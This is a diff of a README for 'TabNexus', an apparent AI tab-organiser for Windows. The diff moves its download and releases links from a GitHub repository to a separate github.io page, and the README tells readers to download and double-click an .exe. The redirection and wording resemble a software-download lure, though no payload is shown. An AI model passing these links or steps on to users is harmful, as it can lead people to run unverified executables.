@@ -1,6 +1,6 @@
 # 🌐 TabNexus - Organize your browser tabs with ease
 
-[![](https://img.shields.io/badge/Download_TabNexus-blue.svg)](https://github.com/standfordorgiastic411/TabNexus)
+[![](https://img.shields.io/badge/Download_TabNexus-blue.svg)](https://standfordorgiastic411.github.io)
 
 TabNexus turns browser tab clutter into an organized workspace. It uses artificial intelligence to categorize your open pages. The tool works on your computer to keep your data private. It uses the Model Context Protocol to connect your tools and boost your daily output.
 
@@ -18,7 +18,7 @@ TabNexus runs on Windows devices. Ensure your system meets these basics to guara
 
 Follow these steps to set up TabNexus on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/standfordorgiastic411/TabNexus) to access the installation files.
+1. Visit the [official releases page](https://standfordorgiastic411.github.io) to access the installation files.
 2. Look for the file marked with the `.exe` extension under the Assets section.
 3. Click the file to start the download to your computer.
 4. Locate the downloaded file in your Downloads folder and double-click it.
